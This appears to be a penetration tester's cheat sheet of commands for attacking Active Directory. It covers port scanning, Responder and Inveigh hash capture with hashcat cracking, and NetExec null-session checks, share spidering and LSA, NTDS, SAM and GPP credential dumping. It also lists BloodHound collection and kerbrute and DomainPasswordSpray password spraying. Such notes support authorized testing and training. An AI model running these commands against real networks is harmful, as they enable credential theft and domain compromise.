## AD Enumeration

### Port Scanning

```bash
# tcp
nmap $TARGET -p- -T4 -vv
nmap $TARGET -p $PORT -T4 -vv -oA TARGET_full_tcp_scan
nmap $TARGET -sU --min-rate=10000 -sV -oA TARGET_udp_scan
# udp
udpx -t $TARGET -c 128 -w 1000
```

### Responder
```bash
responder.py -I $INTERFACE
responder.py -I $INTERFACE --lm
responder.py -I $INTERFACE -w
responder.py -I $INTERFACE -A
## Cracking using hashcat
hashcat -m 5600 file /path/2/rockyou.txt
```

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### NETEXEC

```bash
nxc smb
  -u '' -p ''
  -u 'had' -p ''
  -u 'guest' -p ''
  --local-auth
  --users
  --rid-brute
  --shares
  -M spider_plus -o DOWNLOAD_FLAG=True
  --lsa --ntds --sam --dpapi
  -M gpp_password
  -M enum_trusts
  # crack the result with 
  gpp-decrypt $PASSWORD

nxc ldap
  --bloodhound
  --pass-pol
  -M get-desc-users
nxc rdp
  --local-auth
nxc winrm
  --local-auth
nxc mssql
  --local-auth
```

### Enum4linux-ng
```bash
enum4linux-ng -A "$TARGET"
```

### Bloodhound
```bash
bloodhound-ce.py --zip -c All -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -ns "$DC_IP"
  -dc "$FQDN"
  --dns-tcp
  --dns-timeout 40
Sharphound.exe -c All -d "$DOMAIN"
```

### Rpcclient
```bash
rpcclient -U "" -N $TARGET
querydominfo
enumdomusers
```

### Kerbrute
```bash
kerbrute userenum -d $DOMAIN --dc $DC_IP /path/2/userslist.txt 
kerbrute passwordspray -d $DOMAIN --dc $DC_IP /path/2/userslist.txt /path/2/passwords_list.txt
```

### PasswordSpray
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
